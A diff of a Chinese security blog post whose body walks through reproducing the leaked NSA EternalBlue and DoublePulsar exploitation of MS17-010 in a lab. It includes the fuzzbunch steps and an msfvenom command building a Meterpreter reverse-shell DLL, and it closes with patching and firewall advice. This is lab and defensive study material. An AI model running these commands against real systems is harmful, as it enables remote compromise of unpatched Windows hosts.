@@ -116,7 +116,7 @@
 <meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/17-4-28/68357990-file_1493347997057_2e1f.png">
 <meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/17-4-28/56721083-file_1493348716416_6f00.png">
 <meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/17-4-28/82624178-file_1493348105266_34db.png">
-<meta property="og:updated_time" content="2017-04-28T12:53:16.159Z">
+<meta property="og:updated_time" content="2018-05-29T10:42:23.327Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="NSA Enternalblue + Doublepulsar 复现 SMB 漏洞">
 <meta name="twitter:description" content="2017年4月14日，Shadow Brokers 再次公开了大量从 NSA 的方程式组织（Equation Group）处窃取的攻击工具，这些工具主要针对 Windows 系统的漏洞，其中还有几个 0 day。工具中的 fuzzbunch 是一个类似于 metasploit 的漏洞利用框架，fb.py 是 fuzzbunch 的入口文件，通过该文件可以调用各攻击模块。 泄露的工具可在 Githu">
@@ -440,9 +440,9 @@
       
         <p>2017年4月14日，Shadow Brokers 再次公开了大量从 NSA 的方程式组织（Equation Group）处窃取的攻击工具，这些工具主要针对 Windows 系统的漏洞，其中还有几个 0 day。工具中的 fuzzbunch 是一个类似于 metasploit 的漏洞利用框架，fb.py 是 fuzzbunch 的入口文件，通过该文件可以调用各攻击模块。</p>
 <p>泄露的工具可在 Github 下载：<a href="https://github.com/misterch0c/shadowbroker" target="_blank" rel="external">https://github.com/misterch0c/shadowbroker</a></p>
-<h3 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a><strong>0x01 影响范围</strong></h3><p>下图中列举了工具中相关模块所影响的服务和系统。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/92526918-file_1493343199647_16966.jpg" alt=""></p>
-<h3 id="0x02-漏洞测试"><a href="#0x02-漏洞测试" class="headerlink" title="0x02 漏洞测试"></a><strong>0x02 漏洞测试</strong></h3><p>下面使用工具中的 fuzzbunch 框架、Eternalblue 和 Doublepulsar 测试 Windows 下的 SMB 漏洞。首先通过 Eternalblue 利用 MS17-010 漏洞攻击 Windows 系统；然后在 Kali Linux 中用 Metasploit 生成一个能建立反向连接的 DLL，并在 Kali 中监听相应端口；最后使用 Doublepulsar 远程注入恶意 DLL 到目标系统，注入成功后 Kali 将与目标系统建立连接。</p>
-<h4 id="1-测试环境"><a href="#1-测试环境" class="headerlink" title="1. 测试环境"></a><strong>1. 测试环境</strong></h4><table>
+<h1 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a>0x01 影响范围</h1><p>下图中列举了工具中相关模块所影响的服务和系统。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/92526918-file_1493343199647_16966.jpg" alt=""></p>
+<h1 id="0x02-漏洞测试"><a href="#0x02-漏洞测试" class="headerlink" title="0x02 漏洞测试"></a>0x02 漏洞测试</h1><p>下面使用工具中的 fuzzbunch 框架、Eternalblue 和 Doublepulsar 测试 Windows 下的 SMB 漏洞。首先通过 Eternalblue 利用 MS17-010 漏洞攻击 Windows 系统；然后在 Kali Linux 中用 Metasploit 生成一个能建立反向连接的 DLL，并在 Kali 中监听相应端口；最后使用 Doublepulsar 远程注入恶意 DLL 到目标系统，注入成功后 Kali 将与目标系统建立连接。</p>
+<h2 id="1-测试环境"><a href="#1-测试环境" class="headerlink" title="1. 测试环境"></a>1. 测试环境</h2><table>
 <thead>
 <tr>
 <th style="text-align:left">PC</th>
@@ -473,14 +473,18 @@
 </tbody>
 </table>
 <p>首先需要把工具中的 windows 拷贝到攻击机 Win 7 x64中，然后在 windows 目录下新建一个 listeningposts 文件夹。</p>
-<h4 id="2-测试流程"><a href="#2-测试流程" class="headerlink" title="2. 测试流程"></a><strong>2. 测试流程</strong></h4><h5 id="1）运行-fuzzbunch-框架"><a href="#1）运行-fuzzbunch-框架" class="headerlink" title="1）运行 fuzzbunch 框架"></a><strong>1）运行 fuzzbunch 框架</strong></h5><p>在 cmd 中进入 windows 目录，运行 <code>python fb.py</code>。输入目标系统 IP（Win 7 x86）和攻击机 IP（Win 7 x64），输入“no” 不重定向，接着输入项目名新建一个项目。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/95094523-file_1493344655277_8614.png" alt="">   </p>
-<h5 id="2）调用-Eternalblue-攻击系统"><a href="#2）调用-Eternalblue-攻击系统" class="headerlink" title="2）调用 Eternalblue 攻击系统"></a><strong>2）调用 Eternalblue 攻击系统</strong></h5><p>运行<code>use Eternalblue</code>，然后大多数步骤只需按回车使用默认参数即可。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/54184530-file_1493344922256_adf5.png" alt=""><br>下面需要选择 <code>1）FB</code> 模式。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/61786740-file_1493345114952_f2f3.png" alt=""><br>接着继续回车，直到成功运行攻击模块。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/73280707-file_1493345362094_157db.png" alt=""></p>
-<h5 id="3）Metasploit-生成恶意-DLL"><a href="#3）Metasploit-生成恶意-DLL" class="headerlink" title="3）Metasploit 生成恶意 DLL"></a><strong>3）Metasploit 生成恶意 DLL</strong></h5><p>在 Kali Linux 下使用 Metasploit 生成恶意 DLL,它将在目标系统中建立一个反向连接。这里生成的 DLL必须要与目标系统版本一致，下面生成 32 bit 的 DLL。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.109.128 LPORT=6666 -f dll &gt; test.dll</div></pre></td></tr></table></figure></p>
+<h2 id="2-测试流程"><a href="#2-测试流程" class="headerlink" title="2. 测试流程"></a>2. 测试流程</h2><h3 id="1）运行-fuzzbunch-框架"><a href="#1）运行-fuzzbunch-框架" class="headerlink" title="1）运行 fuzzbunch 框架"></a>1）运行 fuzzbunch 框架</h3><p>在 cmd 中进入 windows 目录，运行 <code>python fb.py</code>。输入目标系统 IP（Win 7 x86）和攻击机 IP（Win 7 x64），输入“no” 不重定向，接着输入项目名新建一个项目。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/95094523-file_1493344655277_8614.png" alt="">      </p>
+<h3 id="2）调用-Eternalblue-攻击系统"><a href="#2）调用-Eternalblue-攻击系统" class="headerlink" title="2）调用 Eternalblue 攻击系统"></a>2）调用 Eternalblue 攻击系统</h3><p>运行<code>use Eternalblue</code>，然后大多数步骤只需按回车使用默认参数即可。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/54184530-file_1493344922256_adf5.png" alt=""><br>下面需要选择 <code>1）FB</code> 模式。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/61786740-file_1493345114952_f2f3.png" alt=""><br>接着继续回车，直到成功运行攻击模块。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/73280707-file_1493345362094_157db.png" alt="">    </p>
+<h3 id="3）Metasploit-生成恶意-DLL"><a href="#3）Metasploit-生成恶意-DLL" class="headerlink" title="3）Metasploit 生成恶意 DLL"></a>3）Metasploit 生成恶意 DLL</h3><p>在 Kali Linux 下使用 Metasploit 生成恶意 DLL,它将在目标系统中建立一个反向连接。这里生成的 DLL必须要与目标系统版本一致，下面生成 32 bit 的 DLL。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.109.128 LPORT=6666 -f dll &gt; test.dll</div></pre></td></tr></table></figure></p>
 <p>之后需要将生成的 test.dll 拷贝到攻击机的 D:\下。</p>
-<h5 id="4）开启-msf-监听"><a href="#4）开启-msf-监听" class="headerlink" title="4）开启 msf 监听"></a><strong>4）开启 msf 监听</strong></h5><p>在 Kali Linux 下，运行 msf，监听 6666 端口。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/80220500-file_1493346556508_101d9.png" alt="">   </p>
-<h5 id="5）调用-Doublepulsar-注入-DLL"><a href="#5）调用-Doublepulsar-注入-DLL" class="headerlink" title="5）调用 Doublepulsar 注入 DLL"></a><strong>5）调用 Doublepulsar 注入 DLL</strong></h5><p>回到攻击机中，执行 <code>use Doublepulsar</code> ，回车使用默认参数直到选择 Function 为2 注入 DLL，然后指定 DLL 的路径。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/11038492-file_1493347262266_5c5.png" alt=""><br>注入成功后将返回如下信息。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/68357990-file_1493347997057_2e1f.png" alt=""><br>但是这里也会出现个问题，多次注入之后目标系统会出错重启。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/56721083-file_1493348716416_6f00.png" alt=""></p>
-<h5 id="6）建立连接"><a href="#6）建立连接" class="headerlink" title="6）建立连接"></a><strong>6）建立连接</strong></h5><p>DLL 注入到目标系统之后，Kali Linux 将与目标系统建立连接。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/82624178-file_1493348105266_34db.png" alt=""></p>
-<h3 id="0x03-防御措施"><a href="#0x03-防御措施" class="headerlink" title="0x03 防御措施"></a><strong>0x03 防御措施</strong></h3><h4 id="1-尽快升级系统补丁"><a href="#1-尽快升级系统补丁" class="headerlink" title="1. 尽快升级系统补丁"></a><strong>1. 尽快升级系统补丁</strong></h4><h4 id="2-开启防火墙，并限制-445-端口"><a href="#2-开启防火墙，并限制-445-端口" class="headerlink" title="2. 开启防火墙，并限制 445 端口"></a><strong>2. 开启防火墙，并限制 445 端口</strong></h4><p>通过以下命令添加防火墙规则：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netsh advfirewall firewall add rule name=&quot;445&quot; protocol=TCP dir=in localport=445 action=block</div></pre></td></tr></table></figure></p>
+<h3 id="4）开启-msf-监听"><a href="#4）开启-msf-监听" class="headerlink" title="4）开启 msf 监听"></a>4）开启 msf 监听</h3><p>在 Kali Linux 下，运行 msf，监听 6666 端口。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/80220500-file_1493346556508_101d9.png" alt="">    </p>
+<h3 id="5）调用-Doublepulsar-注入-DLL"><a href="#5）调用-Doublepulsar-注入-DLL" class="headerlink" title="5）调用 Doublepulsar 注入 DLL"></a>5）调用 Doublepulsar 注入 DLL</h3><p>回到攻击机中，执行 <code>use Doublepulsar</code> ，回车使用默认参数直到选择 Function 为2 注入 DLL，然后指定 DLL 的路径。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/11038492-file_1493347262266_5c5.png" alt=""><br>注入成功后将返回如下信息。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/68357990-file_1493347997057_2e1f.png" alt=""><br>但是这里也会出现个问题，多次注入之后目标系统会出错重启。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/56721083-file_1493348716416_6f00.png" alt=""></p>
+<h3 id="6）建立连接"><a href="#6）建立连接" class="headerlink" title="6）建立连接"></a>6）建立连接</h3><p>DLL 注入到目标系统之后，Kali Linux 将与目标系统建立连接。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/82624178-file_1493348105266_34db.png" alt=""></p>
+<h1 id="0x03-防御措施"><a href="#0x03-防御措施" class="headerlink" title="0x03 防御措施"></a>0x03 防御措施</h1><ol>
+<li>尽快升级系统补丁     </li>
+<li>开启防火墙，并限制 445 端口<br>通过以下命令添加防火墙规则：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netsh advfirewall firewall add rule name=&quot;445&quot; protocol=TCP dir=in localport=445 action=block</div></pre></td></tr></table></figure>
+</li>
+</ol>
 <hr>
 <p>References:<br>[1] <a href="http://blog.injectxx.com/2017/04/18/%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0%E3%80%82/" target="_blank" rel="external">NSA工具包之0day Eternalblue 复现笔记</a><br>[2] <a href="https://www.exploit-db.com/docs/41896.pdf" target="_blank" rel="external">HOW TO EXPLOIT ETERNALBLUE &amp; DOUBLEPULSAR TO GET AN<br>EMPIRE/METERPRETER SESSION ON WINDOWS 7/2008</a><br>[3] <a href="https://www.vulbox.com/knowledge/detail/?id=6" target="_blank" rel="external">NSA Fuzzbunch分析与利用案例</a></p>
 
@@ -619,7 +623,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">20</span>
+                <span class="site-state-item-count">22</span>
                 <span class="site-state-item-name">posts</span>
               </a>
             </div>
@@ -630,7 +634,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">6</span>
+                <span class="site-state-item-count">7</span>
                 <span class="site-state-item-name">categories</span>
               </a>
             </div>
@@ -641,7 +645,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">45</span>
+                <span class="site-state-item-count">47</span>
                 <span class="site-state-item-name">tags</span>
               </a>
             </div>
@@ -700,7 +704,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-影响范围"><span class="nav-number">1.</span> <span class="nav-text">0x01 影响范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-漏洞测试"><span class="nav-number">2.</span> <span class="nav-text">0x02 漏洞测试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-测试环境"><span class="nav-number">2.1.</span> <span class="nav-text">1. 测试环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-测试流程"><span class="nav-number">2.2.</span> <span class="nav-text">2. 测试流程</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1）运行-fuzzbunch-框架"><span class="nav-number">2.2.1.</span> <span class="nav-text">1）运行 fuzzbunch 框架</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2）调用-Eternalblue-攻击系统"><span class="nav-number">2.2.2.</span> <span class="nav-text">2）调用 Eternalblue 攻击系统</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3）Metasploit-生成恶意-DLL"><span class="nav-number">2.2.3.</span> <span class="nav-text">3）Metasploit 生成恶意 DLL</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4）开启-msf-监听"><span class="nav-number">2.2.4.</span> <span class="nav-text">4）开启 msf 监听</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5）调用-Doublepulsar-注入-DLL"><span class="nav-number">2.2.5.</span> <span class="nav-text">5）调用 Doublepulsar 注入 DLL</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6）建立连接"><span class="nav-number">2.2.6.</span> <span class="nav-text">6）建立连接</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-防御措施"><span class="nav-number">3.</span> <span class="nav-text">0x03 防御措施</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-尽快升级系统补丁"><span class="nav-number">3.1.</span> <span class="nav-text">1. 尽快升级系统补丁</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-开启防火墙，并限制-445-端口"><span class="nav-number">3.2.</span> <span class="nav-text">2. 开启防火墙，并限制 445 端口</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-影响范围"><span class="nav-number">1.</span> <span class="nav-text">0x01 影响范围</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-漏洞测试"><span class="nav-number">2.</span> <span class="nav-text">0x02 漏洞测试</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-测试环境"><span class="nav-number">2.1.</span> <span class="nav-text">1. 测试环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-测试流程"><span class="nav-number">2.2.</span> <span class="nav-text">2. 测试流程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1）运行-fuzzbunch-框架"><span class="nav-number">2.2.1.</span> <span class="nav-text">1）运行 fuzzbunch 框架</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2）调用-Eternalblue-攻击系统"><span class="nav-number">2.2.2.</span> <span class="nav-text">2）调用 Eternalblue 攻击系统</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3）Metasploit-生成恶意-DLL"><span class="nav-number">2.2.3.</span> <span class="nav-text">3）Metasploit 生成恶意 DLL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4）开启-msf-监听"><span class="nav-number">2.2.4.</span> <span class="nav-text">4）开启 msf 监听</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5）调用-Doublepulsar-注入-DLL"><span class="nav-number">2.2.5.</span> <span class="nav-text">5）调用 Doublepulsar 注入 DLL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6）建立连接"><span class="nav-number">2.2.6.</span> <span class="nav-text">6）建立连接</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-防御措施"><span class="nav-number">3.</span> <span class="nav-text">0x03 防御措施</span></a></li></ol></div>
             
 
           </div>
